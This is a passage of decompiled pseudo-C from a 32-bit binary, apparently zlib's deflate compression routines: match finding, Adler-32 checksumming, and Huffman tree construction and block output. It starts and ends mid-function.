        v14 = v12 + 1;
        do
        {
          v15 = *++v13;
          v16 = v14 + 1;
          if ( v15 != *v16 )
            break;
          v17 = *++v13;
          v18 = v16 + 1;
          if ( v17 != *v18 )
            break;
          v19 = *++v13;
          v20 = v18 + 1;
          if ( v19 != *v20 )
            break;
          v21 = *++v13;
          v22 = v20 + 1;
          if ( v21 != *v22 )
            break;
          v23 = *++v13;
          v24 = v22 + 1;
          if ( v23 != *v24 )
            break;
          v25 = *++v13;
          v26 = v24 + 1;
          if ( v25 != *v26 )
            break;
          v27 = *++v13;
          v28 = v26 + 1;
          if ( v27 != *v28 )
            break;
          v29 = *++v13;
          v14 = v28 + 1;
          if ( v29 != *v14 )
            break;
        }
        while ( v13 < v8 );
        v30 = v13;
        v7 = v8 - 258;
        v31 = v30 - v8 + 258;
        if ( v31 > (int)v5 )
        {
          a1[26] = a2;
          v5 = v31;
          if ( v31 >= v35 )
            break;
          v38 = v7[v31 - 1];
          v33 = v7[v31];
        }
      }
    }
    a2 = *(unsigned __int16 *)(a1[14] + 2 * (a2 & a1[11]));
    if ( (unsigned __int16)a2 <= v36 )
      break;
    --v34;
  }
  while ( v34 );
  result = v37;
  if ( v5 <= v37 )
    return v5;
  return result;
}

//----- (00405650) --------------------------------------------------------
int __cdecl sub_405650(_DWORD *a1, int a2)
{
  int v3; // edi
  unsigned int v4; // eax
  int v6; // edx
  int v7; // ecx
  int v8; // eax
  unsigned int v9; // edx
  int v10; // eax
  unsigned int v11; // eax
  unsigned int v12; // eax
  unsigned int v13; // ebp
  __int16 v14; // ax
  unsigned __int16 v15; // ax
  int v16; // eax
  int v17; // eax
  BOOL v18; // ebx
  unsigned int v19; // edx
  int v20; // ecx
  int v21; // eax
  int v22; // eax
  int v23; // ecx
  int v24; // edx
  _BYTE *v25; // eax
  unsigned __int8 v26; // al
  int v27; // ecx
  _BYTE *v28; // eax
  int v29; // ecx
  int v30; // edx
  int v31; // ecx
  int v32; // eax
  int v33; // ecx
  _BYTE *v34; // eax
  int v36; // eax
  int v37; // [esp-14h] [ebp-28h]
  int v38; // [esp-14h] [ebp-28h]
  int v39; // [esp-14h] [ebp-28h]
  unsigned __int8 v40; // [esp+18h] [ebp+4h]
  unsigned __int8 v41; // [esp+1Ch] [ebp+8h]

  v3 = 0;
  while ( 1 )
  {
    v4 = a1[27];
    if ( v4 < 0x106 )
    {
      sub_405000((int)a1);
      v4 = a1[27];
      if ( v4 < 0x106 && !a2 )
        return 0;
      if ( !v4 )
        break;
    }
    if ( v4 >= 3 )
    {
      v6 = a1[25];
      v7 = a1[15];
      v8 = a1[19] & (*(unsigned __int8 *)(a1[12] + v6 + 2) ^ (a1[16] << a1[20]));
      HIWORD(v3) = 0;
      a1[16] = v8;
      LOWORD(v3) = *(_WORD *)(v7 + 2 * v8);
      *(_WORD *)(a1[14] + 2 * (v6 & a1[11])) = v3;
      *(_WORD *)(a1[15] + 2 * a1[16]) = *((_WORD *)a1 + 50);
    }
    v9 = a1[22];
    v10 = a1[26];
    a1[28] = v9;
    a1[23] = v10;
    a1[22] = 2;
    if ( v3 && v9 < a1[30] && a1[25] - v3 <= (unsigned int)(a1[9] - 262) )
    {
      if ( a1[32] != 2 )
        a1[22] = sub_4054E0(a1, v3);
      v11 = a1[22];
      if ( v11 <= 5 && (a1[32] == 1 || v11 == 3 && (unsigned int)(a1[25] - a1[26]) > 0x1000) )
        a1[22] = 2;
    }
    v12 = a1[28];
    if ( v12 < 3 || a1[22] > v12 )
    {
      if ( a1[24] )
      {
        v26 = *(_BYTE *)(a1[25] + a1[12] - 1);
        *(_WORD *)(a1[1447] + 2 * a1[1446]) = 0;
        *(_BYTE *)(a1[1444] + a1[1446]++) = v26;
        ++LOWORD(a1[v26 + 35]);
        if ( a1[1446] == a1[1445] - 1 )
        {
          v27 = a1[21];
          if ( v27 < 0 )
            v28 = 0;
          else
            v28 = (_BYTE *)(a1[12] + v27);
          sub_405CC0((int)a1, v28, a1[25] - v27, 0);
          v38 = *a1;
          a1[21] = a1[25];
          sub_404E20(v38);
        }
        v29 = a1[27] - 1;
        ++a1[25];
        v30 = *a1;
        a1[27] = v29;
        if ( !*(_DWORD *)(v30 + 16) )
          return 0;
      }
      else
      {
        v31 = a1[25] + 1;
        v32 = a1[27] - 1;
        a1[24] = 1;
        a1[25] = v31;
        a1[27] = v32;
      }
    }
    else
    {
      v13 = a1[25] + a1[27] - 3;
      v14 = a1[25] - *((_WORD *)a1 + 46) - 1;
      v40 = *((_BYTE *)a1 + 112) - 3;
      *(_WORD *)(a1[1447] + 2 * a1[1446]) = v14;
      v15 = v14 - 1;
      *(_BYTE *)(a1[1444] + a1[1446]++) = v40;
      ++LOWORD(a1[(unsigned __int8)byte_41EDC0[v40] + 292]);
      if ( v15 >= 0x100u )
        v16 = (unsigned __int8)byte_41ECC0[v15 >> 7];
      else
        v16 = (unsigned __int8)byte_41EBC0[v15];
      ++LOWORD(a1[v16 + 608]);
      v17 = a1[28];
      v18 = a1[1446] == a1[1445] - 1;
      a1[27] += 1 - v17;
      a1[28] = v17 - 2;
      do
      {
        v19 = a1[25] + 1;
        a1[25] = v19;
        if ( v19 <= v13 )
        {
          v20 = a1[15];
          v21 = a1[19] & (*(unsigned __int8 *)(a1[12] + v19 + 2) ^ (a1[16] << a1[20]));
          HIWORD(v3) = 0;
          a1[16] = v21;
          LOWORD(v3) = *(_WORD *)(v20 + 2 * v21);
          *(_WORD *)(a1[14] + 2 * (v19 & a1[11])) = v3;
          *(_WORD *)(a1[15] + 2 * a1[16]) = *((_WORD *)a1 + 50);
        }
        v22 = a1[28] - 1;
        a1[28] = v22;
      }
      while ( v22 );
      v23 = a1[25] + 1;
      a1[24] = 0;
      a1[22] = 2;
      a1[25] = v23;
      if ( v18 )
      {
        v24 = a1[21];
        v25 = v24 < 0 ? 0 : (_BYTE *)(v24 + a1[12]);
        sub_405CC0((int)a1, v25, v23 - v24, 0);
        v37 = *a1;
        a1[21] = a1[25];
        sub_404E20(v37);
        if ( !*(_DWORD *)(*a1 + 16) )
          return 0;
      }
    }
  }
  if ( a1[24] )
  {
    v41 = *(_BYTE *)(a1[25] + a1[12] - 1);
    *(_WORD *)(a1[1447] + 2 * a1[1446]) = 0;
    *(_BYTE *)(a1[1444] + a1[1446]++) = v41;
    ++LOWORD(a1[v41 + 35]);
    a1[24] = 0;
  }
  v33 = a1[21];
  if ( v33 < 0 )
    v34 = 0;
  else
    v34 = (_BYTE *)(v33 + a1[12]);
  sub_405CC0((int)a1, v34, a1[25] - v33, a2 == 4);
  v39 = *a1;
  a1[21] = a1[25];
  sub_404E20(v39);
  if ( !*(_DWORD *)(*a1 + 16) )
    return a2 != 4 ? 0 : 2;
  v36 = -(a2 != 4);
  LOBYTE(v36) = v36 & 0xFE;
  return v36 + 3;
}

//----- (00405A80) --------------------------------------------------------
int __cdecl sub_405A80(unsigned int a1, unsigned __int8 *a2, unsigned int a3)
{
  unsigned __int8 *v3; // esi
  unsigned int v4; // ecx
  unsigned int v5; // edi
  unsigned int i; // ebx
  int v8; // eax
  unsigned int v9; // ebp
  int v10; // edx
  int v11; // ecx
  int v12; // edi
  int v13; // ecx
  int v14; // edi
  int v15; // ecx
  int v16; // edi
  int v17; // ecx
  int v18; // edi
  int v19; // ecx
  int v20; // edi
  int v21; // ecx
  int v22; // edi
  int v23; // ecx
  int v24; // edi
  int v25; // ecx
  int v26; // edi
  int v27; // ecx
  int v28; // edi
  int v29; // ecx
  int v30; // edi
  int v31; // ecx
  int v32; // edi
  int v33; // ecx
  int v34; // edi
  int v35; // ecx
  int v36; // edi
  int v37; // ecx
  int v38; // edi
  int v39; // ecx
  int v40; // edi

  v3 = a2;
  v4 = (unsigned __int16)a1;
  v5 = HIWORD(a1);
  if ( !a2 )
    return 1;
  for ( i = a3; i; v5 %= 0xFFF1u )
  {
    v8 = i;
    if ( i >= 0x15B0 )
      v8 = 5552;
    i -= v8;
    if ( v8 >= 16 )
    {
      v9 = (unsigned int)v8 >> 4;
      v8 += -16 * ((unsigned int)v8 >> 4);
      do
      {
        v10 = *v3;
        v3 += 16;
        v11 = v10 + v4;
        v12 = v11 + v5;
        v13 = *(v3 - 15) + v11;
        v14 = v13 + v12;
        v15 = *(v3 - 14) + v13;
        v16 = v15 + v14;
        v17 = *(v3 - 13) + v15;
        v18 = v17 + v16;
        v19 = *(v3 - 12) + v17;
        v20 = v19 + v18;
        v21 = *(v3 - 11) + v19;
        v22 = v21 + v20;
        v23 = *(v3 - 10) + v21;
        v24 = v23 + v22;
        v25 = *(v3 - 9) + v23;
        v26 = v25 + v24;
        v27 = *(v3 - 8) + v25;
        v28 = v27 + v26;
        v29 = *(v3 - 7) + v27;
        v30 = v29 + v28;
        v31 = *(v3 - 6) + v29;
        v32 = v31 + v30;
        v33 = *(v3 - 5) + v31;
        v34 = v33 + v32;
        v35 = *(v3 - 4) + v33;
        v36 = v35 + v34;
        v37 = *(v3 - 3) + v35;
        v38 = v37 + v36;
        v39 = *(v3 - 2) + v37;
        v40 = v39 + v38;
        v4 = *(v3 - 1) + v39;
        v5 = v4 + v40;
        --v9;
      }
      while ( v9 );
    }
    for ( ; v8; --v8 )
    {
      v4 += *v3++;
      v5 += v4;
    }
    v4 %= 0xFFF1u;
  }
  return v4 | (v5 << 16);
}

//----- (00405BB0) --------------------------------------------------------
_WORD *__cdecl sub_405BB0(int a1)
{
  int v1; // ecx
  _WORD *v2; // eax
  _WORD *v3; // eax
  int v4; // ecx
  _WORD *result; // eax
  int v6; // ecx

  v1 = 286;
  v2 = (_WORD *)(a1 + 140);
  do
  {
    *v2 = 0;
    v2 += 2;
    --v1;
  }
  while ( v1 );
  v3 = (_WORD *)(a1 + 2432);
  v4 = 30;
  do
  {
    *v3 = 0;
    v3 += 2;
    --v4;
  }
  while ( v4 );
  result = (_WORD *)(a1 + 2676);
  v6 = 19;
  do
  {
    *result = 0;
    result += 2;
    --v6;
  }
  while ( v6 );
  *(_DWORD *)(a1 + 5796) = 0;
  *(_DWORD *)(a1 + 5792) = 0;
  *(_DWORD *)(a1 + 5800) = 0;
  *(_DWORD *)(a1 + 5784) = 0;
  *(_WORD *)(a1 + 1164) = 1;
  return result;
}

//----- (00405C20) --------------------------------------------------------
_BYTE *__cdecl sub_405C20(int a1, _BYTE *a2, int a3, int a4)
{
  int v4; // ecx
  int v5; // esi
  int v6; // ecx
  int v7; // edi
  int v8; // esi
  int v9; // esi

  v4 = *(_DWORD *)(a1 + 5812);
  if ( v4 <= 13 )
  {
    *(_WORD *)(a1 + 5808) |= a4 << v4;
    *(_DWORD *)(a1 + 5812) = v4 + 3;
  }
  else
  {
    v5 = a4 << v4;
    v6 = *(_DWORD *)(a1 + 8);
    *(_WORD *)(a1 + 5808) |= v5;
    *(_BYTE *)(v6 + *(_DWORD *)(a1 + 20)) = *(_BYTE *)(a1 + 5808);
    v7 = *(_DWORD *)(a1 + 8);
    LOBYTE(v6) = *(_BYTE *)(a1 + 5809);
    v8 = *(_DWORD *)(a1 + 20) + 1;
    *(_DWORD *)(a1 + 20) = v8;
    *(_BYTE *)(v7 + v8) = v6;
    v9 = *(_DWORD *)(a1 + 5812);
    ++*(_DWORD *)(a1 + 20);
    *(_DWORD *)(a1 + 5812) = v9 - 13;
    *(_WORD *)(a1 + 5808) = (unsigned __int16)a4 >> (16 - v9);
  }
  return sub_407330((_DWORD *)a1, a2, a3, 1);
}

//----- (00405CC0) --------------------------------------------------------
_WORD *__cdecl sub_405CC0(int a1, _BYTE *a2, int a3, int a4)
{
  int v4; // eax
  unsigned int v5; // edx
  unsigned int v6; // ecx
  int v7; // edi
  bool v8; // zf
  int v9; // ecx
  int v10; // eax
  int v11; // edx
  int v12; // ecx
  int v13; // ebx
  int v14; // edx
  int v15; // edx
  int v16; // edx
  int v17; // ebp
  int v18; // ebp
  int v19; // ebx
  int v20; // ebx
  _WORD *result; // eax

  v4 = 0;
  if ( *(int *)(a1 + 124) <= 0 )
  {
    v6 = a3 + 5;
LABEL_7:
    v5 = v6;
    goto LABEL_8;
  }
  if ( *(_BYTE *)(a1 + 28) == 2 )
    sub_407210(a1);
  sub_405EB0((_DWORD *)a1, (int *)(a1 + 2832));
  sub_405EB0((_DWORD *)a1, (int *)(a1 + 2844));
  v4 = sub_406480(a1);
  v5 = (unsigned int)(*(_DWORD *)(a1 + 5792) + 10) >> 3;
  v6 = (unsigned int)(*(_DWORD *)(a1 + 5796) + 10) >> 3;
  if ( v6 <= v5 )
    goto LABEL_7;
LABEL_8:
  if ( a3 + 4 <= v5 && a2 )
  {
    v7 = a4;
    sub_405C20(a1, a2, a3, a4);
  }
  else
  {
    v8 = v6 == v5;
    v9 = *(_DWORD *)(a1 + 5812);
    if ( v8 )
    {
      v7 = a4;
      v10 = a4 + 2;
      if ( v9 <= 13 )
      {
        *(_WORD *)(a1 + 5808) |= v10 << v9;
        *(_DWORD *)(a1 + 5812) = v9 + 3;
      }
      else
      {
        v11 = v10 << v9;
        v12 = *(_DWORD *)(a1 + 8);
        *(_WORD *)(a1 + 5808) |= v11;
        *(_BYTE *)(v12 + *(_DWORD *)(a1 + 20)) = *(_BYTE *)(a1 + 5808);
        v13 = *(_DWORD *)(a1 + 8);
        v14 = *(_DWORD *)(a1 + 20) + 1;
        *(_DWORD *)(a1 + 20) = v14;
        *(_BYTE *)(v13 + v14) = *(_BYTE *)(a1 + 5809);
        v15 = *(_DWORD *)(a1 + 5812);
        ++*(_DWORD *)(a1 + 20);
        *(_DWORD *)(a1 + 5812) = v15 - 13;
        *(_WORD *)(a1 + 5808) = (unsigned __int16)v10 >> (16 - v15);
      }
      sub_406DD0(a1, (int)&unk_41E6C8, (int)&unk_41EB48);
    }
    else
    {
      v7 = a4;
      v16 = a4 + 4;
      if ( v9 <= 13 )
      {
        *(_WORD *)(a1 + 5808) |= v16 << v9;
        *(_DWORD *)(a1 + 5812) = v9 + 3;
      }
      else
      {
        v17 = *(_DWORD *)(a1 + 8);
        *(_WORD *)(a1 + 5808) |= v16 << v9;
        *(_BYTE *)(*(_DWORD *)(a1 + 20) + v17) = *(_BYTE *)(a1 + 5808);
        v18 = *(_DWORD *)(a1 + 8);
        v19 = *(_DWORD *)(a1 + 20) + 1;
        *(_DWORD *)(a1 + 20) = v19;
        *(_BYTE *)(v19 + v18) = *(_BYTE *)(a1 + 5809);
        v20 = *(_DWORD *)(a1 + 5812);
        ++*(_DWORD *)(a1 + 20);
        *(_DWORD *)(a1 + 5812) = v20 - 13;
        *(_WORD *)(a1 + 5808) = (unsigned __int16)v16 >> (16 - v20);
      }
      sub_4065E0(a1, *(_DWORD *)(a1 + 2836) + 1, *(_DWORD *)(a1 + 2848) + 1, v4 + 1);
      sub_406DD0(a1, a1 + 140, a1 + 2432);
    }
  }
  result = sub_405BB0(a1);
  if ( v7 )
    return (_WORD *)sub_4072B0(a1);
  return result;
}

//----- (00405EB0) --------------------------------------------------------
unsigned int __cdecl sub_405EB0(_DWORD *a1, int *a2)
{
  _WORD *v3; // edi
  int *v4; // eax
  int v5; // ebp
  int v6; // ebx
  int v7; // ecx
  int v8; // eax
  _WORD *v9; // edx
  int v10; // ecx
  int v11; // ecx
  int v12; // eax
  int v13; // ecx
  int i; // ebx
  int v15; // eax
  int v16; // ebx
  int v17; // ebp
  int v18; // edx
  int v19; // ecx
  char v20; // al
  int v21; // ecx
  int v22; // edx
  int v24; // [esp+10h] [ebp-8h]
  int v25; // [esp+14h] [ebp-4h]
  _WORD *v26; // [esp+1Ch] [ebp+4h]

  v3 = (_WORD *)*a2;
  v4 = (int *)a2[2];
  v5 = -1;
  v6 = *v4;
  v7 = v4[3];
  v8 = 0;
  v25 = v7;
  v24 = -1;
  a1[1298] = 0;
  a1[1299] = 573;
  if ( v7 > 0 )
  {
    v9 = v3;
    do
    {
      if ( *v9 )
      {
        v24 = v8;
        v10 = a1[1298] + 1;
        v5 = v8;
        a1[1298] = v10;
        a1[v10 + 725] = v8;
        *((_BYTE *)a1 + v8 + 5200) = 0;
      }
      else
      {
        v9[1] = 0;
      }
      ++v8;
      v9 += 2;
    }
    while ( v8 < v25 );
  }
  v11 = a1[1298];
  if ( v11 < 2 )
  {
    do
    {
      if ( v5 >= 2 )
        v12 = 0;
      else
        v12 = ++v5;
      v13 = v11 + 1;
      a1[1298] = v13;
      a1[v13 + 725] = v12;
      v3[2 * v12] = 1;
      *((_BYTE *)a1 + v12 + 5200) = 0;
      --a1[1448];
      if ( v6 )
        a1[1449] -= *(unsigned __int16 *)(v6 + 4 * v12 + 2);
      v11 = a1[1298];
    }
    while ( v11 < 2 );
    v24 = v5;
  }
  a2[1] = v5;
  for ( i = a1[1298] / 2; i >= 1; --i )
    sub_4060F0((int)a1, (int)v3, i);
  v26 = &v3[2 * v25];
  do
  {
    v15 = a1[1298];
    v16 = a1[726];
    a1[726] = a1[v15 + 725];
    a1[1298] = v15 - 1;
    sub_4060F0((int)a1, (int)v3, 1);
    v17 = a1[726];
    v18 = a1[1299] - 1;
    a1[1299] = v18;
    a1[v18 + 725] = v16;
    v19 = a1[1299] - 1;
    a1[1299] = v19;
    a1[v19 + 725] = v17;
    *v26 = v3[2 * v16] + v3[2 * v17];
    if ( *((_BYTE *)a1 + v16 + 5200) < *((_BYTE *)a1 + v17 + 5200) )
      v20 = *((_BYTE *)a1 + v17 + 5200);
    else
      v20 = *((_BYTE *)a1 + v16 + 5200);
    *((_BYTE *)a1 + v25 + 5200) = v20 + 1;
    v3[2 * v17 + 1] = v25;
    v3[2 * v16 + 1] = v25;
    a1[726] = v25++;
    v26 += 2;
    sub_4060F0((int)a1, (int)v3, 1);
  }
  while ( (int)a1[1298] >= 2 );
  v21 = a1[726];
  v22 = a1[1299] - 1;
  a1[1299] = v22;
  a1[v22 + 725] = v21;
  sub_4061D0(a1, a2);
  return sub_406400(v3, v24, (int)(a1 + 717));
}

//----- (004060F0) --------------------------------------------------------
int __cdecl sub_4060F0(int a1, int a2, int a3)
{
  int result; // eax
  int v4; // edx
  int v5; // ebp
  int v6; // ecx
  bool v7; // cc
  int v8; // esi
  int v9; // ebp
  unsigned __int16 v10; // dx
  unsigned __int16 v11; // bx
  int v12; // esi
  unsigned __int16 v13; // dx
  unsigned __int16 v14; // bx
  int v15; // edx
  int v16; // edx
  int v17; // [esp+14h] [ebp+4h]

  result = a1;
  v4 = *(_DWORD *)(a1 + 5192);
  v5 = *(_DWORD *)(a1 + 4 * a3 + 2900);
  v6 = 2 * a3;
  v7 = 2 * a3 < v4;
  v17 = v5;
  if ( 2 * a3 > v4 )
  {
    *(_DWORD *)(result + 4 * a3 + 2900) = v5;
  }
  else
  {
    while ( 1 )
    {
      if ( v7 )
      {
        v8 = *(_DWORD *)(result + 4 * v6 + 2904);
        v9 = *(_DWORD *)(result + 4 * v6 + 2900);
        v10 = *(_WORD *)(a2 + 4 * v8);
        v11 = *(_WORD *)(a2 + 4 * v9);
        if ( v10 < v11 || v10 == v11 && *(_BYTE *)(v8 + result + 5200) <= *(_BYTE *)(result + v9 + 5200) )
          ++v6;
        v5 = v17;
      }
      v12 = *(_DWORD *)(result + 4 * v6 + 2900);
      v13 = *(_WORD *)(a2 + 4 * v5);
      v14 = *(_WORD *)(a2 + 4 * v12);
      if ( v13 < v14 )
      {
LABEL_12:
        *(_DWORD *)(result + 4 * a3 + 2900) = v5;
        return result;
      }
      if ( v13 == v14 && *(_BYTE *)(result + v5 + 5200) <= *(_BYTE *)(v12 + result + 5200) )
        break;
      v15 = a3;
      a3 = v6;
      v6 *= 2;
      *(_DWORD *)(result + 4 * v15 + 2900) = v12;
      v16 = *(_DWORD *)(result + 5192);
      v7 = v6 < v16;
      if ( v6 > v16 )
        goto LABEL_12;
    }
    *(_DWORD *)(result + 4 * a3 + 2900) = v5;
  }
  return result;
}

//----- (004061D0) --------------------------------------------------------
__int16 __cdecl sub_4061D0(_DWORD *a1, int *a2)
{
  int v2; // ebx
  int *v3; // eax
  int v4; // ebp
  int v6; // eax
  int v7; // esi
  int v8; // eax
  int v9; // esi
  int v10; // ecx
  int v11; // eax
  int v12; // edi
  int v13; // esi
  bool v14; // zf
  int v15; // edi
  _WORD *i; // ecx
  int v17; // edi
  _WORD *v18; // ebp
  int v19; // ebp
  int v20; // ecx
  _WORD *v21; // esi
  int v22; // eax
  int v24; // [esp+10h] [ebp-1Ch]
  int v25; // [esp+14h] [ebp-18h]
  int v26; // [esp+18h] [ebp-14h]
  _WORD *v27; // [esp+18h] [ebp-14h]
  int v28; // [esp+1Ch] [ebp-10h]
  int v29; // [esp+20h] [ebp-Ch]
  int v30; // [esp+24h] [ebp-8h]
  int v31; // [esp+28h] [ebp-4h]
  int *v32; // [esp+30h] [ebp+4h]
  int v33; // [esp+30h] [ebp+4h]
  int v34; // [esp+34h] [ebp+8h]

  v2 = *a2;
  v3 = (int *)a2[2];
  v28 = a2[1];
  v4 = v3[4];
  v25 = *v3;
  v30 = v3[1];
  v29 = v3[2];
  v24 = 0;
  memset(a1 + 717, 0, 0x20u);
  v6 = a1[1299];
  v31 = v4;
  *(_WORD *)(v2 + 4 * a1[v6 + 725] + 2) = 0;
  v7 = a1[1299] + 1;
  if ( v7 < 573 )
  {
    v32 = &a1[v7 + 725];
    v8 = 573 - v7;
    v9 = 573;
    v26 = v8;
    v34 = 573;
    do
    {
      v10 = *v32;
      v11 = *(unsigned __int16 *)(v2 + 4 * *(unsigned __int16 *)(v2 + 4 * *v32 + 2) + 2) + 1;
      if ( v11 > v4 )
      {
        v11 = v4;
        ++v24;
      }
      *(_WORD *)(v2 + 4 * v10 + 2) = v11;
      if ( v10 <= v28 )
      {
        ++*((_WORD *)a1 + v11 + 1434);
        v12 = 0;
        if ( v10 >= v29 )
          v12 = *(_DWORD *)(v30 + 4 * (v10 - v29));
        v13 = *(unsigned __int16 *)(v2 + 4 * v10);
        a1[1448] += v13 * (v12 + v11);
        if ( v25 )
        {
          v4 = v31;
          a1[1449] += v13 * (v12 + *(unsigned __int16 *)(v25 + 4 * v10 + 2));
        }
        v9 = 573;
      }
      LOWORD(v6) = v26 - 1;
      v14 = v26 == 1;
      ++v32;
      --v26;
    }
    while ( !v14 );
    v15 = v24;
    if ( v24 )
    {
      do
      {
        v6 = v4 - 1;
        for ( i = (_WORD *)a1 + v4 + 1433; !*i; --v6 )
          --i;
        --*((_WORD *)a1 + v6 + 1434);
        *((_WORD *)a1 + v6 + 1435) += 2;
        --*((_WORD *)a1 + v4 + 1434);
        v15 -= 2;
      }
      while ( v15 > 0 );
      v17 = v4;
      if ( v4 )
      {
        v18 = (_WORD *)a1 + v4 + 1434;
        v27 = v18;
        do
        {
          v6 = (unsigned __int16)*v18;
          v33 = v6;
          if ( *v18 )
          {
            v19 = (int)&a1[v9 + 725];
            do
            {
              v20 = *(_DWORD *)(v19 - 4);
              v19 -= 4;
              --v34;
              if ( v20 <= v28 )
              {
                v21 = (_WORD *)(v2 + 4 * v20 + 2);
                HIWORD(v22) = 0;
                if ( (unsigned __int16)*v21 != v17 )
                {
                  LOWORD(v22) = *v21;
                  a1[1448] += *(unsigned __int16 *)(v2 + 4 * v20) * (v17 - v22);
                  *v21 = v17;
                }
                v6 = --v33;
              }
            }
            while ( v6 );
            v9 = v34;
          }
          --v17;
          v18 = --v27;
        }
        while ( v17 );
      }
    }
  }
  return v6;
}

//----- (00406400) --------------------------------------------------------
unsigned int __cdecl sub_406400(_WORD *a1, int a2, int a3)
{
  __int16 v3; // ax
  char *v4; // ecx
  int v5; // esi
  __int16 v6; // di
  unsigned int result; // eax
  int v9; // edi
  int v10; // ecx
  unsigned __int16 v11; // dx
  char v13[30]; // [esp+Ah] [ebp-1Eh] BYREF

  v3 = 0;
  v4 = v13;
  v5 = 15;
  do
  {
    v6 = *(_WORD *)&v4[a3 - (_DWORD)v13];
    v4 += 2;
    v3 = 2 * (v3 + v6);
    --v5;
    *((_WORD *)v4 - 1) = v3;
  }
  while ( v5 );
  result = a2;
  if ( a2 >= 0 )
  {
    v9 = a2 + 1;
    do
    {
      v10 = (unsigned __int16)a1[1];
      if ( (_WORD)v10 )
      {
        v11 = *(_WORD *)&v13[2 * v10 - 2];
        *(_WORD *)&v13[2 * v10 - 2] = v11 + 1;
        result = sub_407290(v11, v10);
        *a1 = result;
      }
      a1 += 2;
      --v9;
    }
    while ( v9 );
  }
  return result;
}

//----- (00406480) --------------------------------------------------------
int __cdecl sub_406480(int a1)
{
  int result; // eax

  sub_4064F0((_WORD *)a1, a1 + 140, *(_DWORD *)(a1 + 2836));
  sub_4064F0((_WORD *)a1, a1 + 2432, *(_DWORD *)(a1 + 2848));
  sub_405EB0((_DWORD *)a1, (int *)(a1 + 2856));
  for ( result = 18; result >= 3; --result )
  {
    if ( *(_WORD *)(a1 + 4 * (unsigned __int8)byte_41E6B4[result] + 2678) )
      break;
  }
  *(_DWORD *)(a1 + 5792) += 3 * result + 17;
  return result;
}

//----- (004064F0) --------------------------------------------------------
int __cdecl sub_4064F0(_WORD *a1, int a2, int a3)
{
  int result; // eax
  int v4; // ecx
  int v5; // edi
  int v6; // edx
  int v7; // esi
  unsigned __int16 *v8; // ebp
  int v9; // eax
  int v10; // [esp+Ch] [ebp-4h]
  int v11; // [esp+18h] [ebp+8h]

  result = a2;
  v4 = *(unsigned __int16 *)(a2 + 2);
  v5 = 0;
  v10 = -1;
  v6 = 7;
  v7 = 4;
  if ( !(_WORD)v4 )
  {
    v6 = 138;
    v7 = 3;
  }
  *(_WORD *)(a2 + 4 * a3 + 6) = -1;
  if ( a3 >= 0 )
  {
    v11 = a3 + 1;
    v8 = (unsigned __int16 *)(result + 6);
    do
    {
      v9 = v4;
      v4 = *v8;
      if ( ++v5 >= v6 || v9 != v4 )
      {
        if ( v5 >= v7 )
        {
          if ( v9 )
          {
            if ( v9 != v10 )
              ++a1[2 * v9 + 1338];
            ++a1[1370];
          }
          else if ( v5 > 10 )
          {
            ++a1[1374];
          }
          else
          {
            ++a1[1372];
          }
        }
        else
        {
          a1[2 * v9 + 1338] += v5;
        }
        v5 = 0;
        v10 = v9;
        if ( v4 )
        {
          if ( v9 == v4 )
          {
            v6 = 6;
            v7 = 3;
          }
          else
          {
            v6 = 7;
            v7 = 4;
          }
        }
        else
        {
          v6 = 138;
          v7 = 3;
        }
      }
      v8 += 2;
      result = --v11;
    }
    while ( v11 );
  }
  return result;
}

//----- (004065E0) --------------------------------------------------------
int __cdecl sub_4065E0(int a1, int a2, int a3, int a4)
{
  int v4; // ecx
  int v5; // edx
  int v6; // ecx
  int v7; // edi
  int v8; // ecx
  int v9; // edx
  int v10; // ecx
  int v11; // edx
  int v12; // ecx
  int v13; // edi
  int v14; // ecx
  int v15; // edx
  int v16; // ecx
  int v17; // eax
  int v18; // edx
  int v19; // ecx
  int v20; // edi
  int v21; // edx
  int v22; // edx
  int i; // edi
  int v24; // ecx
  unsigned __int16 v25; // ax
  int v26; // edx
  int v27; // ecx
  int v28; // ebx
  int v29; // edx
  int v30; // edx

  v4 = *(_DWORD *)(a1 + 5812);
  if ( v4 <= 11 )
  {
    *(_WORD *)(a1 + 5808) |= (a2 - 257) << v4;
    *(_DWORD *)(a1 + 5812) = v4 + 5;
  }
  else
  {
    v5 = (a2 - 257) << v4;
    v6 = *(_DWORD *)(a1 + 20);
    *(_WORD *)(a1 + 5808) |= v5;
    *(_BYTE *)(v6 + *(_DWORD *)(a1 + 8)) = *(_BYTE *)(a1 + 5808);
    v7 = *(_DWORD *)(a1 + 8);
    LOBYTE(v5) = *(_BYTE *)(a1 + 5809);
    v8 = *(_DWORD *)(a1 + 20) + 1;
    *(_DWORD *)(a1 + 20) = v8;
    *(_BYTE *)(v8 + v7) = v5;
    v9 = *(_DWORD *)(a1 + 5812);
    ++*(_DWORD *)(a1 + 20);
    *(_DWORD *)(a1 + 5812) = v9 - 11;
    *(_WORD *)(a1 + 5808) = (unsigned __int16)(a2 - 257) >> (16 - v9);
  }
  v10 = *(_DWORD *)(a1 + 5812);
  if ( v10 <= 11 )
  {
    *(_WORD *)(a1 + 5808) |= (a3 - 1) << v10;
    *(_DWORD *)(a1 + 5812) = v10 + 5;
  }
  else
  {
    v11 = (a3 - 1) << v10;
    v12 = *(_DWORD *)(a1 + 20);
    *(_WORD *)(a1 + 5808) |= v11;
    *(_BYTE *)(v12 + *(_DWORD *)(a1 + 8)) = *(_BYTE *)(a1 + 5808);
    v13 = *(_DWORD *)(a1 + 8);
    LOBYTE(v11) = *(_BYTE *)(a1 + 5809);
    v14 = *(_DWORD *)(a1 + 20) + 1;
    *(_DWORD *)(a1 + 20) = v14;
    *(_BYTE *)(v14 + v13) = v11;
    v15 = *(_DWORD *)(a1 + 5812);
    ++*(_DWORD *)(a1 + 20);
    *(_DWORD *)(a1 + 5812) = v15 - 11;
    *(_WORD *)(a1 + 5808) = (unsigned __int16)(a3 - 1) >> (16 - v15);
  }
  v16 = *(_DWORD *)(a1 + 5812);
  v17 = a4 - 4;
  if ( v16 <= 12 )
  {
    *(_WORD *)(a1 + 5808) |= v17 << v16;
    *(_DWORD *)(a1 + 5812) = v16 + 4;
  }
  else
  {
    v18 = v17 << v16;
    v19 = *(_DWORD *)(a1 + 20);
    *(_WORD *)(a1 + 5808) |= v18;
    *(_BYTE *)(v19 + *(_DWORD *)(a1 + 8)) = *(_BYTE *)(a1 + 5808);
    v20 = *(_DWORD *)(a1 + 8);
    v21 = *(_DWORD *)(a1 + 20) + 1;
    *(_DWORD *)(a1 + 20) = v21;
    *(_BYTE *)(v21 + v20) = *(_BYTE *)(a1 + 5809);
    v22 = *(_DWORD *)(a1 + 5812);
    ++*(_DWORD *)(a1 + 20);
    *(_DWORD *)(a1 + 5812) = v22 - 12;
